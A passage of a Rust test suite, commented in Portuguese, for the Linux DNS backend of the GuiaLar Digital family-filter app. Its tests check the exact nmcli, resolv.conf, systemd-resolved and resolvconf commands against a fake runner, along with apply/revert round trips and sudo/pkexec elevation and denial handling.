//! Testes do backend Linux com `FakeRunner` (ADR-029, camada 2): argv exato, `apply ∘ revert`,
//! idempotência e falha de elevação. Nada aqui toca o DNS, o `/etc` nem a rede da máquina.

use super::*;
use crate::config::FilterMode;
use crate::platform::runner::fake::FakeRunner;
use crate::platform::{next_apply_step, ApplyStep};
use crate::testenv::Sandbox;

const V4: &str = "1.1.1.3 1.0.0.3";
const V6: &str = "2606:4700:4700::1113 2606:4700:4700::1003";
const RESOLV: &str = "/etc/resolv.conf";
const DROPIN_DIR: &str = "/etc/systemd/resolved.conf.d";
const DROPIN: &str = "/etc/systemd/resolved.conf.d/99-guialar.conf";

fn v(a: &[&str]) -> Vec<String> {
    a.iter().map(|s| s.to_string()).collect()
}

/// O que `main::apply_flow` faz sobre o backend: decide (`next_apply_step`) e aplica.
fn apply(r: &FakeRunner) -> Result<()> {
    match next_apply_step(|| configured_dns_with(r))? {
        ApplyStep::AlreadyActive => Ok(()),
        ApplyStep::Switch(m) => switch_mode_with(r, m),
        ApplyStep::Fresh => apply_dns_with(r),
    }
}

fn manifest() -> DnsStateManifest {
    DnsStateManifest::load()
        .unwrap()
        .expect("manifesto gravado")
}

fn revert(r: &FakeRunner) -> Result<()> {
    revert_dns_with(r, &manifest())
}

/// Ethernet por DHCP + Wi-Fi com DNS fixo.
fn nm_machine() -> FakeRunner {
    FakeRunner::new()
        .with_nm_conn("uuid-eth", "802-3-ethernet", "", false)
        .with_nm_conn("uuid-wifi", "802-11-wireless", "192.168.0.1 8.8.8.8", true)
}

fn resolved_machine() -> FakeRunner {
    FakeRunner::new().with_path("/run/systemd/resolve")
}

fn resolvconf_machine() -> FakeRunner {
    FakeRunner::new().with_command("resolvconf")
}

fn direct_machine() -> FakeRunner {
    FakeRunner::new().with_file(RESOLV, "nameserver 192.168.1.1\nsearch lan\n")
}

// ---------------------------------------------------------------- detecção

#[test]
fn detecta_o_backend_na_ordem_nm_resolved_resolvconf_direto() {
    let tudo = nm_machine()
        .with_path("/run/systemd/resolve")
        .with_command("resolvconf");
    assert_eq!(
        detect_active_backend_with(&tudo),
        BackendKind::NetworkManager
    );
    // nmcli não responde: cai para o systemd-resolved
    let sem_nm = nm_machine()
        .with_path("/run/systemd/resolve")
        .with_command("resolvconf")
        .deny("nmcli", 1);
    assert_eq!(
        detect_active_backend_with(&sem_nm),
        BackendKind::SystemdResolved
    );
    assert_eq!(
        detect_active_backend_with(&resolved_machine().with_command("resolvconf")),
        BackendKind::SystemdResolved
    );
    assert_eq!(
        detect_active_backend_with(&resolvconf_machine()),
        BackendKind::OpenResolvRunit
    );
    assert_eq!(
        detect_active_backend_with(&direct_machine()),
        BackendKind::DirectResolvConf
    );
    assert_eq!(
        detect_active_backend_with(&FakeRunner::new()),
        BackendKind::DirectResolvConf
    );
}

#[test]
fn dns_configurado_junta_resolv_conf_e_nmcli() {
    let r = FakeRunner::new()
        .with_file(RESOLV, "nameserver 127.0.0.53\noptions edns0\n")
        .with_nm_conn("u", "802-3-ethernet", "", false);
    let ips: Vec<String> = configured_dns_with(&r)
        .iter()
        .map(|i| i.to_string())
        .collect();
    assert_eq!(ips, ["127.0.0.53", "10.0.2.3"]);
}

// ----------------------------------------------------------- NetworkManager

#[test]
fn nm_apply_usa_o_argv_de_producao_na_ordem() {
    let _s = Sandbox::new("nm-apply");
    let r = nm_machine();
    apply_dns_with(&r).unwrap();
    let mut esperado = vec![
        v(&["nmcli", "general", "status"]),
        v(&[
            "nmcli",
            "-t",
            "-f",
            "UUID,TYPE",
            "connection",
            "show",
            "--active",
        ]),
    ];
    for u in ["uuid-eth", "uuid-wifi"] {
        esperado.push(v(&[
            "nmcli",
            "-t",
            "-f",
            "ipv4.dns,ipv4.ignore-auto-dns",
            "connection",
            "show",
            u,
        ]));
        // IPv6: chamada própria, logo depois da do IPv4 (o argv do IPv4 não mudou)
        esperado.push(v(&[
            "nmcli",
            "-t",
            "-f",
            "ipv6.dns,ipv6.ignore-auto-dns",
            "connection",
            "show",
            u,
        ]));
        esperado.push(v(&[
            "nmcli",
            "connection",
            "modify",
            u,
            "ipv4.dns",
            V4,
            "ipv4.ignore-auto-dns",
            "yes",
        ]));
        esperado.push(v(&[
            "nmcli",
            "connection",
            "modify",
            u,
            "ipv6.dns",
            V6,
            "ipv6.ignore-auto-dns",
            "yes",
        ]));
        esperado.push(v(&["nmcli", "connection", "up", "uuid", u]));
    }
    assert_eq!(r.argvs(), esperado);
    // e o manifesto guarda o DNS de antes de cada conexão
    let m = manifest();
    assert_eq!(m.backend, BackendKind::NetworkManager);
    assert_eq!(m.connections.len(), 2);
    assert!(m.connections[0].was_dhcp_ipv4);
    assert!(m.connections[0].original_ipv4_dns.is_empty());
    assert!(!m.connections[1].was_dhcp_ipv4);
    assert_eq!(m.connections[1].original_ipv4_dns.len(), 2);
}

#[test]
fn nm_revert_usa_o_argv_de_producao_na_ordem() {
    let _s = Sandbox::new("nm-revert");
    let r = nm_machine();
    apply_dns_with(&r).unwrap();
    r.clear_calls();
    revert(&r).unwrap();
    let reset6 = |u: &str| {
        v(&[
            "nmcli",
            "connection",
            "modify",
            u,
            "ipv6.dns",
            "",
            "ipv6.ignore-auto-dns",
            "no",
        ])
    };
    let up = |u: &str| v(&["nmcli", "connection", "up", "uuid", u]);
    assert_eq!(
        r.argvs(),
        vec![
            // DHCP: zera o DNS e volta a aceitar o da rede
            v(&[
                "nmcli",
                "connection",
                "modify",
                "uuid-eth",
                "ipv4.dns",
                "",
                "ipv4.ignore-auto-dns",
                "no"
            ]),
            reset6("uuid-eth"),
            up("uuid-eth"),
            // DNS fixo: devolve os IPs de antes
            v(&[
                "nmcli",
                "connection",
                "modify",
                "uuid-wifi",
                "ipv4.dns",
                "192.168.0.1 8.8.8.8"
            ]),
            reset6("uuid-wifi"),
            up("uuid-wifi"),
        ]
    );
}

#[test]
fn nm_apply_depois_revert_devolve_o_estado_original() {
    let s = Sandbox::new("nm-roundtrip");
    let r = nm_machine();
    let original = r.state();
    apply_dns_with(&r).unwrap();
    assert_ne!(r.state(), original);
    assert_eq!(r.nm_prop("uuid-eth", "ipv4.dns"), V4);
    assert_eq!(r.nm_prop("uuid-wifi", "ipv6.dns"), V6);
    revert(&r).unwrap();
    assert_eq!(r.state(), original);
    assert!(!s.manifest_path().exists(), "o revert apaga o manifesto");
    assert_eq!(
        crate::verify::check_status(),
        crate::verify::ProtectionStatus::Unprotected,
        "depois do revert o status volta a desprotegido"
    );
}

#[test]
fn nm_apply_duas_vezes_e_idempotente() {
    let s = Sandbox::new("nm-idem");
    let r = nm_machine();
    let original = r.state();
    apply(&r).unwrap();
    let m1 = manifest();
    let aplicado = r.state();
    r.clear_calls();

    apply(&r).unwrap();
    assert_eq!(r.state(), aplicado, "segundo apply não mexe no DNS");
    assert!(
        r.argvs()
            .iter()
            .all(|a| !a.contains(&"modify".to_string()) && !a.contains(&"up".to_string())),
        "segundo apply não escreve: {:?}",
        r.argvs()
    );
    let m2 = manifest();
    assert_eq!(m1.applied_at_utc, m2.applied_at_utc);
    assert_eq!(
        m1.connections[1].original_ipv4_dns, m2.connections[1].original_ipv4_dns,
        "o DNS de antes não vira o do filtro"
    );

    revert(&r).unwrap();
    assert_eq!(
        r.state(),
        original,
        "revert depois de dois apply = estado original"
    );
    assert!(!s.manifest_path().exists());
}

#[test]
fn nm_trocar_de_modo_mantem_o_dns_original() {
    let _s = Sandbox::new("nm-switch");
    let r = nm_machine();
    let original = r.state();
    apply(&r).unwrap();
    crate::config::set_mode(FilterMode::AdsOnly);
    r.clear_calls();
    apply(&r).unwrap();
    let ads4 = format!(
        "{} {}",
        FilterMode::AdsOnly.ipv4()[0],
        FilterMode::AdsOnly.ipv4()[1]
    );
    let ads6 = format!(
        "{} {}",
        FilterMode::AdsOnly.ipv6()[0],
        FilterMode::AdsOnly.ipv6()[1]
    );
    assert_eq!(
        r.argvs()[1..4],
        [
            v(&[
                "nmcli",
                "connection",
                "modify",
                "uuid-eth",
                "ipv4.dns",
                &ads4,
                "ipv4.ignore-auto-dns",
                "yes"
            ]),
            v(&[
                "nmcli",
                "connection",
                "modify",
                "uuid-eth",
                "ipv6.dns",
                &ads6,
                "ipv6.ignore-auto-dns",
                "yes"
            ]),
            v(&["nmcli", "connection", "up", "uuid", "uuid-eth"]),
        ]
    );
    let m = manifest();
    assert_eq!(m.mode, FilterMode::AdsOnly);
    assert_eq!(
        m.connections[1].original_ipv4_dns.len(),
        2,
        "DNS de antes preservado"
    );
    revert(&r).unwrap();
    assert_eq!(r.state(), original);
}

#[test]
fn nm_dns_trocado_por_fora_e_reaplicado_sem_perder_o_original() {
    let _s = Sandbox::new("nm-foreign");
    let r = nm_machine();
    let original = r.state();
    apply(&r).unwrap();
    // alguém troca o DNS do Wi-Fi por fora
    run_privileged_command(
        &r,
        "nmcli",
        &["connection", "modify", "uuid-wifi", "ipv4.dns", "9.9.9.9"],
    )
    .unwrap();
    apply(&r).unwrap();
    assert_eq!(
        r.nm_prop("uuid-wifi", "ipv4.dns"),
        V4,
        "voltou para o filtro"
    );
    revert(&r).unwrap();
    assert_eq!(r.state(), original);
}

// --------------------------------------------------------- systemd-resolved

#[test]
fn resolved_apply_e_revert_usam_o_argv_de_producao() {
    let s = Sandbox::new("resolved");
    let r = resolved_machine();
    let original = r.state();
    apply_dns_with(&r).unwrap();
    let conf = format!("[Resolve]\nDNS={V4} {V6}\n");
    let calls = r.calls();
    assert_eq!(calls.len(), 3);
    assert_eq!(calls[0].argv, v(&["mkdir", "-p", DROPIN_DIR]));
    assert_eq!(calls[1].argv, v(&["tee", DROPIN]));
    assert_eq!(calls[1].stdin.as_deref(), Some(conf.as_str()));
    assert_eq!(
        calls[2].argv,
        v(&["systemctl", "restart", "systemd-resolved"])
    );
    assert_eq!(manifest().backend, BackendKind::SystemdResolved);

    r.clear_calls();
    revert(&r).unwrap();
    assert_eq!(
        r.argvs(),
        vec![
            v(&["rm", "-f", DROPIN]),
            v(&["systemctl", "restart", "systemd-resolved"])
        ]
    );
    assert_eq!(r.state(), original);
    assert!(!s.manifest_path().exists());
}

#[test]
fn resolved_com_a_pasta_do_dropin_nao_cria_de_novo() {
    let _s = Sandbox::new("resolved-dir");
    let r = resolved_machine().with_dir(DROPIN_DIR);
    apply_dns_with(&r).unwrap();
    assert_eq!(r.argvs()[0], v(&["tee", DROPIN]));
    assert_eq!(r.argvs().len(), 2);
}

#[test]
fn resolved_revert_sem_dropin_nao_faz_nada() {
    let _s = Sandbox::new("resolved-nodrop");
    let r = resolved_machine();
    revert_systemd_resolved(&r).unwrap();
    assert!(r.argvs().is_empty());
}

#[test]
fn resolved_apply_duas_vezes_e_idempotente() {
    let _s = Sandbox::new("resolved-idem");
    let r = resolved_machine();
    let original = r.state();
    apply(&r).unwrap();
    // o resolved mostra o DNS do drop-in pelo resolvectl; aqui o fake não tem resolvectl,
    // então o DNS lido some: o plano é reaplicar, sem sobrescrever o manifesto.
    let m1 = manifest();
    apply(&r).unwrap();
    assert_eq!(m1.applied_at_utc, manifest().applied_at_utc);
    revert(&r).unwrap();
    assert_eq!(r.state(), original);
}

// ------------------------------------------------------- runit / resolvconf

#[test]
fn resolvconf_apply_e_revert_usam_o_argv_de_producao() {
    let _s = Sandbox::new("resolvconf");
    let r = resolvconf_machine();
    let original = r.state();
    apply_dns_with(&r).unwrap();
    let calls = r.calls();
    assert_eq!(calls.len(), 1);
    assert_eq!(calls[0].argv, v(&["resolvconf", "-a", "guialar"]));
    let esperado = "nameserver 1.1.1.3\nnameserver 1.0.0.3\nnameserver 2606:4700:4700::1113\nnameserver 2606:4700:4700::1003\n";
    assert_eq!(calls[0].stdin.as_deref(), Some(esperado));
    assert_ne!(r.state(), original);
    r.clear_calls();
    revert(&r).unwrap();
    assert_eq!(r.argvs(), vec![v(&["resolvconf", "-d", "guialar"])]);
    assert_eq!(r.state(), original);
}

// ------------------------------------------------------------ resolv.conf

#[test]
fn direto_apply_e_revert_usam_o_argv_de_producao() {
    let _s = Sandbox::new("direct");
    let r = direct_machine();
    let original = r.state();
    apply_dns_with(&r).unwrap();
    let calls = r.calls();
    assert_eq!(calls.len(), 1);
    assert_eq!(calls[0].argv, v(&["tee", RESOLV]));
    let novo = "# Gerado pelo GuiaLar Digital - Protecao Familiar\nnameserver 1.1.1.3\nnameserver 1.0.0.3\nnameserver 2606:4700:4700::1113\nnameserver 2606:4700:4700::1003\n";
    assert_eq!(calls[0].stdin.as_deref(), Some(novo));
    assert_eq!(
        manifest().previous_resolv_conf.as_deref(),
        Some("nameserver 192.168.1.1\nsearch lan\n")
    );
    r.clear_calls();
    revert(&r).unwrap();
    let c = r.calls();
    assert_eq!(c.len(), 1);
    assert_eq!(c[0].argv, v(&["tee", RESOLV]));
    assert_eq!(
        c[0].stdin.as_deref(),
        Some("nameserver 192.168.1.1\nsearch lan\n")
    );
    assert_eq!(r.state(), original, "resolv.conf volta byte a byte");
}

#[test]
fn direto_apply_duas_vezes_nao_perde_o_resolv_conf_original() {
    let _s = Sandbox::new("direct-idem");
    let r = direct_machine();
    let original = r.state();
    apply(&r).unwrap();
    apply(&r).unwrap();
    assert_eq!(
        manifest().previous_resolv_conf.as_deref(),
        Some("nameserver 192.168.1.1\nsearch lan\n"),
        "o segundo apply não grava o resolv.conf do filtro como 'original'"
    );
    revert(&r).unwrap();
    assert_eq!(r.state(), original);
}

// ------------------------------------------------------- privilégio / UAC

#[test]
fn fora_do_root_o_comando_leva_o_prefixo_de_elevacao() {
    let r = FakeRunner::new().not_root(&["sudo", "-n"]);
    run_privileged_command(&r, "systemctl", &["restart", "systemd-resolved"]).unwrap();
    write_privileged_file(&r, "/etc/x.conf", "dados").unwrap();
    let c = r.calls();
    assert_eq!(
        c[0].argv,
        v(&["sudo", "-n", "systemctl", "restart", "systemd-resolved"])
    );
    assert_eq!(c[1].argv, v(&["sudo", "-n", "tee", "/etc/x.conf"]));
    assert_eq!(c[1].stdin.as_deref(), Some("dados"));
    let p = FakeRunner::new().not_root(&["pkexec"]);
    run_privileged_command(&p, "rm", &["-f", "/etc/x"]).unwrap();
    assert_eq!(p.argvs(), vec![v(&["pkexec", "rm", "-f", "/etc/x"])]);
}

#[test]
fn elevacao_tenta_sudo_sem_senha_e_so_depois_pkexec() {
    let _s = Sandbox::new("elev-ordem");
    let exe = std::env::current_exe()
        .unwrap()
        .to_string_lossy()
        .into_owned();

    // sudo -n funciona: usa sudo e não chama pkexec
    let r = FakeRunner::new()
        .not_root(&[])
        .with_command("sudo")
        .with_command("pkexec");
    elevate_self(&r, "internal-revert").unwrap();
    assert_eq!(
        r.argvs(),
        vec![
            v(&["sudo", "-n", "true"]),
            v(&["sudo", "-n", &exe, "internal-revert"])
        ]
    );

    // sudo pede senha: pkexec
    let r = FakeRunner::new()
        .not_root(&[])
        .with_command("sudo")
        .with_command("pkexec")
        .deny("sudo", 1);
    elevate_self(&r, "internal-apply --mode ads").unwrap();
    assert_eq!(
        r.argvs(),
        vec![
            v(&["sudo", "-n", "true"]),
            v(&["pkexec", &exe, "internal-apply", "--mode", "ads"])
        ]
    );

    // só pkexec: nem sonda o sudo
    let r = FakeRunner::new().not_root(&[]).with_command("pkexec");
    elevate_self(&r, "internal-revert").unwrap();
    assert_eq!(r.argvs(), vec![v(&["pkexec", &exe, "internal-revert"])]);

    // nenhum dos dois
    let r = FakeRunner::new().not_root(&[]);
    let e = elevate_self(&r, "internal-revert").unwrap_err();
    assert!(format!("{e:#}").contains("elevação indisponível"));
    assert!(r.argvs().is_empty());
}

/// Ambiente de um AppImage de mentira: `APPDIR` é a pasta do executável de teste, então o
/// teste «está dentro do AppImage». `XDG_RUNTIME_DIR` aponta para uma pasta `0700` do Sandbox.
#[cfg(unix)]
fn appimage_de_mentira(s: &Sandbox) -> std::path::PathBuf {
    use std::os::unix::fs::PermissionsExt;
    let xdg = s.dir().join("xdg-runtime");
    std::fs::create_dir_all(&xdg).unwrap();
    std::fs::set_permissions(&xdg, std::fs::Permissions::from_mode(0o700)).unwrap();
    std::env::set_var("XDG_RUNTIME_DIR", &xdg);
    let appdir = std::env::current_exe()
        .unwrap()
        .parent()
        .unwrap()
        .to_path_buf();
    std::env::set_var("APPDIR", &appdir);
    std::env::set_var("APPIMAGE", "/home/u/GuiaLar.AppImage");
    xdg
}

#[cfg(unix)]
#[test]
fn elevacao_em_appimage_eleva_uma_copia_do_binario_sem_shell_pkexec_e_sudo() {
    use std::os::unix::fs::PermissionsExt;
    let s = Sandbox::new("elev-appimage");
    let xdg = appimage_de_mentira(&s);
    let visto = std::rc::Rc::new(std::cell::RefCell::new(Vec::<String>::new()));
    let v2 = visto.clone();
    let xdg2 = xdg.clone();
    // no instante em que o pkexec/sudo roda, a cópia existe, é 0700 e igual ao binário
    let sonda = move |argv: &[String]| {
        let Some(exe) = argv
            .iter()
            .find(|a| a.contains("/guialar-") && a.ends_with("/guialar"))
        else {
            return;
        };
        let p = std::path::Path::new(exe);
        let dir = p.parent().unwrap();
        assert!(
            dir.starts_with(&xdg2),
            "cópia fora do XDG_RUNTIME_DIR: {exe}"
        );
        let md = std::fs::metadata(p).unwrap();
        let dm = std::fs::metadata(dir).unwrap();
        v2.borrow_mut().push(format!(
            "{:o}/{:o}/{}",
            dm.permissions().mode() & 0o777,
            md.permissions().mode() & 0o777,
            md.len() == std::fs::metadata("/proc/self/exe").unwrap().len()
        ));
    };
    // pkexec
    let r = FakeRunner::new()
        .not_root(&[])
        .with_command("pkexec")
        .with_on_run(sonda.clone());
    elevate_self(&r, "internal-revert").unwrap();
    let argv = r.argvs();
    assert_eq!(argv.len(), 1);
    assert_eq!(argv[0][0], "pkexec");
    assert_eq!(
        argv[0].len(),
        3,
        "pkexec <cópia> internal-revert, sem shell: {:?}",
        argv[0]
    );
    assert!(argv[0][1].starts_with(xdg.join("guialar-").to_str().unwrap()));
    assert!(argv[0][1].ends_with("/guialar"));
    assert_eq!(argv[0][2], "internal-revert");
    assert!(!argv[0]
        .iter()
        .any(|a| a == "/bin/sh" || a == "-c" || a == "env"));
    // sudo: sonda `sudo -n true` e depois a cópia com `-n`
    let r = FakeRunner::new()
        .not_root(&[])
        .with_command("sudo")
        .with_command("pkexec")
        .with_on_run(sonda);
    elevate_self(&r, "internal-apply --mode ads").unwrap();
    let argv = r.argvs();
    assert_eq!(argv[0], v(&["sudo", "-n", "true"]));
    assert_eq!(&argv[1][..2], ["sudo", "-n"]);
    assert!(argv[1][2].ends_with("/guialar"));
    assert_eq!(&argv[1][3..], ["internal-apply", "--mode", "ads"]);
    // a cópia existia (0700/0700, igual ao binário) em cada elevação
    assert_eq!(*visto.borrow(), ["700/700/true", "700/700/true"]);
    // e some ao final, sem sobra no XDG_RUNTIME_DIR
    let sobra: Vec<_> = std::fs::read_dir(&xdg).unwrap().collect();
    assert!(sobra.is_empty(), "a cópia deve ser apagada: {sobra:?}");
}

#[cfg(unix)]
#[test]
fn elevacao_em_appimage_apaga_a_copia_mesmo_com_erro() {
    let s = Sandbox::new("elev-appimage-erro");
    let xdg = appimage_de_mentira(&s);
    let r = FakeRunner::new()
        .not_root(&[])
        .with_command("pkexec")
        .deny("pkexec", 126);
    let e = elevate_self(&r, "internal-revert").unwrap_err();
    assert!(format!("{e:#}").contains("negada"), "{e:#}");
    assert!(
        std::fs::read_dir(&xdg).unwrap().next().is_none(),
        "sem sobra"
    );
}

#[cfg(unix)]
#[test]
fn elevacao_em_appimage_pkexec_127_e_senha_negada_e_sudo_127_e_nao_executou() {
    let s = Sandbox::new("elev-appimage-127");
    appimage_de_mentira(&s);
    // pkexec: 127 = «Not authorized» (senha errada/política) mesmo dentro do AppImage
    let r = FakeRunner::new()
        .not_root(&[])
        .with_command("pkexec")
        .deny("pkexec", 127);
    let msg = format!("{:#}", elevate_self(&r, "internal-revert").unwrap_err());
    assert!(msg.contains("negada") && msg.contains("127"), "{msg}");
    assert!(!msg.contains("não pôde ser executado"), "{msg}");
    let (curto, _) = crate::ui::theme::humanize_error(&msg);
    assert!(
        curto.contains("permissão de administrador não foi concedida"),
        "{curto}"
    );
    // pkexec 126 (janela fechada): negada, com o código real
    let r = FakeRunner::new()
        .not_root(&[])
        .with_command("pkexec")
        .deny("pkexec", 126);
    let msg = format!("{:#}", elevate_self(&r, "internal-revert").unwrap_err());
    assert!(msg.contains("negada") && msg.contains("126"), "{msg}");
    // sudo: a sonda passa e a cópia não executa (126/127) → «não pôde ser executado»
    for code in [126, 127] {
        let r = FakeRunner::new()
            .not_root(&[])
            .with_command("sudo")
            .with_command("pkexec")
            .with_exit_code("sudo", code, &["sudo", "-n", "true"]);
        let msg = format!("{:#}", elevate_self(&r, "internal-revert").unwrap_err());
        assert!(
            msg.contains("não pôde ser executado") && msg.contains(&code.to_string()),
            "{msg}"
        );
        assert!(!msg.contains("negada"), "{msg}");
        let (curto, _) = crate::ui::theme::humanize_error(&msg);
        assert!(curto.contains("Nada foi alterado"), "{curto}");
    }
}

#[test]
fn elevacao_fora_do_appimage_usa_o_executavel_e_127_continua_negada() {
    let _s = Sandbox::new("elev-fora");
    // APPIMAGE herdado de OUTRO AppImage: o executável não está no APPDIR dele
    std::env::set_var("APPIMAGE", "/home/u/Outro.AppImage");
    std::env::set_var("APPDIR", "/tmp/.mount_OutroXYZ");
    let exe = std::env::current_exe()
        .unwrap()
        .to_string_lossy()
        .into_owned();
    let r = FakeRunner::new()
        .not_root(&[])
        .with_command("pkexec")
        .deny("pkexec", 127);
    let e = elevate_self(&r, "internal-revert").unwrap_err();
    assert!(format!("{e:#}").contains("negada"), "{e:#}");
    assert_eq!(r.argvs(), vec![v(&["pkexec", &exe, "internal-revert"])]);
    std::env::remove_var("APPIMAGE");
    std::env::remove_var("APPDIR");
}

#[test]
fn permissao_negada_no_apply_nao_altera_nada() {
    let s = Sandbox::new("uac-apply");
    let r = nm_machine()
        .not_root(&[])
        .with_command("pkexec")
        .deny("pkexec", 126);
    let original = r.state();
    let e = apply_dns_with(&r).unwrap_err();
    let msg = format!("{e:#}");
    assert!(msg.contains("negada"), "{msg}");
    assert_eq!(r.state(), original, "DNS intacto");
    assert!(!s.manifest_path().exists(), "sem manifesto");
    assert_eq!(
        r.argvs().len(),
        1,
        "só o pedido de elevação: {:?}",
        r.argvs()
    );
    let (curto, detalhe) = crate::ui::theme::humanize_error(&msg);
    assert!(curto.contains("Nada foi alterado"), "{curto}");
    assert_eq!(detalhe, msg);
}

#[test]
fn permissao_negada_no_revert_mantem_manifesto_e_dns_filtrado() {
    let s = Sandbox::new("uac-revert");
    let r = nm_machine().with_command("pkexec");
    apply_dns_with(&r).unwrap();
    let filtrado = r.state();
    let manifesto = std::fs::read_to_string(s.manifest_path()).unwrap();

    r.set_root(false);
    r.add_deny("pkexec", 126);
    let e = revert(&r).unwrap_err();
    let msg = format!("{e:#}");
    assert!(msg.contains("negada"), "{msg}");
    assert_eq!(r.state(), filtrado, "DNS continua no filtro");
    assert_eq!(
        std::fs::read_to_string(s.manifest_path()).unwrap(),
        manifesto
    );
    assert!(crate::ui::theme::humanize_error(&msg)
        .0
        .contains("Nada foi alterado"));

    // tentar de novo e aceitar: agora restaura
    r.clear_deny();
    r.set_root(true);
    revert(&r).unwrap();
    assert!(!s.manifest_path().exists());
}

#[test]
fn comando_que_falha_no_meio_nao_grava_manifesto() {
    let s = Sandbox::new("tee-falha");
    let r = direct_machine().deny("tee", 1);
    let original = r.state();
    let e = apply_dns_with(&r).unwrap_err();
    assert!(format!("{e:#}").contains("Falha ao gravar /etc/resolv.conf"));
    assert_eq!(r.state(), original);
    assert!(!s.manifest_path().exists());
}

// ------------------------------------------------------ revert sem manifesto

#[test]
fn sem_manifesto_e_rede_normal_nao_ha_o_que_reverter() {
    let s = Sandbox::new("nomanifest-normal");
    let r = nm_machine();
    let original = r.state();
    assert!(!s.manifest_path().exists());
    assert!(!cloudflare_dns_active_with(&r));
    assert_eq!(r.state(), original);
    assert!(
        r.argvs().iter().all(|a| !a.contains(&"modify".to_string())),
        "só leituras: {:?}",
        r.argvs()
    );
}

#[test]
fn sem_manifesto_com_filtro_ativo_volta_ao_automatico() {
    let s = Sandbox::new("nomanifest-filter");
    let r = nm_machine();
    apply_dns_with(&r).unwrap();
    DnsStateManifest::remove_manifest().unwrap();
    assert!(
        cloudflare_dns_active_with(&r),
        "o filtro ainda está na conexão"
    );
    r.clear_calls();
    revert_dns_fallback_with(&r).unwrap();
    let reset = |u: &str, fam: &str| {
        v(&[
            "nmcli",
            "connection",
            "modify",
            u,
            &format!("{fam}.dns"),
            "",
            &format!("{fam}.ignore-auto-dns"),
            "no",
        ])
    };
    let argv = r.argvs();
    assert_eq!(argv[0], v(&["nmcli", "general", "status"]));
    assert_eq!(
        argv[1],
        v(&[
            "nmcli",
            "-t",
            "-f",
            "UUID,TYPE",
            "connection",
            "show",
            "--active"
        ])
    );
    assert_eq!(argv[2], reset("uuid-eth", "ipv4"));
    assert_eq!(argv[3], reset("uuid-eth", "ipv6"));
    assert_eq!(
        argv[4],
        v(&["nmcli", "connection", "up", "uuid", "uuid-eth"])
    );
    assert_eq!(r.nm_prop("uuid-wifi", "ipv4.dns"), "");
    assert_eq!(r.nm_prop("uuid-wifi", "ipv4.ignore-auto-dns"), "no");
    assert!(!s.manifest_path().exists());
}

#[test]
fn sem_manifesto_o_resolv_conf_so_perde_as_linhas_do_filtro() {
    let _s = Sandbox::new("nomanifest-direct");
    let r = FakeRunner::new().with_file(
        RESOLV,
        "# Gerado pelo GuiaLar Digital - Protecao Familiar\nnameserver 1.1.1.3\nnameserver 192.168.1.1\n",
    );
    revert_dns_fallback_with(&r).unwrap();
    assert_eq!(
        r.read_file(RESOLV).as_deref(),
        Some("nameserver 192.168.1.1\n")
    );
}

#[test]
fn deny_do_programa_vale_mesmo_com_prefixo_de_elevacao() {
    let r = FakeRunner::new().not_root(&["sudo", "-n"]).deny("tee", 1);
    let e = write_privileged_file(&r, "/etc/x", "a").unwrap_err();
    assert!(format!("{e:#}").contains("Falha ao gravar"));
    assert!(r.state().files.is_empty());
}

// ------------------------------------- ticket #24: o revert devolve o DNS fixo (v4 e v6)

/// Roda apply e revert e exige o estado original de volta, em tudo (v4 e v6).
fn ida_e_volta(r: &FakeRunner, nome: &str) {
    let _s = Sandbox::new(nome);
    let original = r.state();
    apply_dns_with(r).unwrap();
    assert_ne!(r.state(), original, "o apply muda algo");
    revert(r).unwrap();
    assert_eq!(r.state(), original, "{nome}: o revert devolve o original");
}

#[test]
fn nm_revert_v4_fixo_com_ignore_auto_dns_no_devolve_o_fixo() {
    // DNS extra fixo SOMADO ao do DHCP (era o defeito: virava vazio)
    let r = FakeRunner::new().with_nm_conn("u", "802-3-ethernet", "10.0.2.99", false);
    ida_e_volta(&r, "nm24-v4-fixo-no");
    assert_eq!(r.nm_prop("u", "ipv4.dns"), "10.0.2.99");
    assert_eq!(r.nm_prop("u", "ipv4.ignore-auto-dns"), "no");
}

#[test]
fn nm_revert_v4_fixo_com_ignore_auto_dns_yes_devolve_o_fixo() {
    let r = FakeRunner::new().with_nm_conn("u", "802-3-ethernet", "10.0.2.98 10.0.2.99", true);
    ida_e_volta(&r, "nm24-v4-fixo-yes");
    assert_eq!(r.nm_prop("u", "ipv4.dns"), "10.0.2.98 10.0.2.99");
    assert_eq!(r.nm_prop("u", "ipv4.ignore-auto-dns"), "yes");
}

#[test]
fn nm_revert_v4_sem_fixo_mantem_o_argv_de_antes() {
    let _s = Sandbox::new("nm24-v4-dhcp");
    let r = FakeRunner::new().with_nm_conn("u", "802-3-ethernet", "", false);
    apply_dns_with(&r).unwrap();
    r.clear_calls();
    revert(&r).unwrap();
    assert_eq!(
        r.argvs()[0],
        v(&[
            "nmcli",
            "connection",
            "modify",
            "u",
            "ipv4.dns",
            "",
            "ipv4.ignore-auto-dns",
            "no"
        ])
    );
}

#[test]
fn nm_revert_v6_fixo_devolve_o_fixo_nos_dois_ignore_auto_dns() {
    let r = FakeRunner::new()
        .with_nm_conn("u", "802-3-ethernet", "", false)
        .with_nm_v6("u", "2001:db8::99 2001:db8::98", false);
    ida_e_volta(&r, "nm24-v6-fixo-no");
    assert_eq!(r.nm_prop("u", "ipv6.dns"), "2001:db8::99 2001:db8::98");
    assert_eq!(r.nm_prop("u", "ipv6.ignore-auto-dns"), "no");

    let r = FakeRunner::new()
        .with_nm_conn("u", "802-3-ethernet", "", false)
        .with_nm_v6("u", "2001:db8::99", true);
    ida_e_volta(&r, "nm24-v6-fixo-yes");
    assert_eq!(r.nm_prop("u", "ipv6.dns"), "2001:db8::99");
    assert_eq!(r.nm_prop("u", "ipv6.ignore-auto-dns"), "yes");
}

#[test]
fn nm_revert_v4_e_v6_fixos_juntos_em_duas_conexoes() {
    let r = FakeRunner::new()
        .with_nm_conn("a", "802-3-ethernet", "10.0.2.99", false)
        .with_nm_v6("a", "2001:db8::99", false)
        .with_nm_conn("b", "802-11-wireless", "192.168.0.1", true)
        .with_nm_v6("b", "2001:db8::1", true);
    ida_e_volta(&r, "nm24-duas");
}

#[test]
fn nm_dns_v6_so_de_filtro_vira_automatico_no_backup() {
    // apply sobre rede já filtrada: o «original» nunca é o filtro do GuiaLar
    let _s = Sandbox::new("nm24-v6-filtro");
    let r = FakeRunner::new()
        .with_nm_conn("u", "802-3-ethernet", "", false)
        .with_nm_v6("u", V6, true);
    apply_dns_with(&r).unwrap();
    let m = manifest();
    assert!(m.connections[0].original_ipv6_dns.is_empty());
    assert!(m.connections[0].was_dhcp_ipv6);
}

#[test]
fn nm_manifesto_antigo_sem_campos_v6_reverte_como_antes() {
    let s = Sandbox::new("nm24-antigo");
    let r = nm_machine();
    let original = r.state();
    apply_dns_with(&r).unwrap();
